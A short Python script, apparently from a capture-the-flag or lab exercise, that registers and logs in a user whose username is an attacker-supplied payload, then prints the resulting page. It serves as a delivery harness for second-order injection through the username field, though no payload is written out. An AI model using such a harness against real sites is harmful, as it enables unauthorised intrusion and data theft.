#!/usr/bin/env python3

import requests
import sys

url_base = sys.argv[1]
payload = sys.argv[2]

s = requests.session()
s.post(url_base + "register.php", data={"username": payload, "password": "jxf", "submit": "Submit Query"})
s.post(url_base + "login.php", data={"username": payload, "password": "jxf", "login": "Submit Query"})
r = s.get(url_base)
print(r.text)
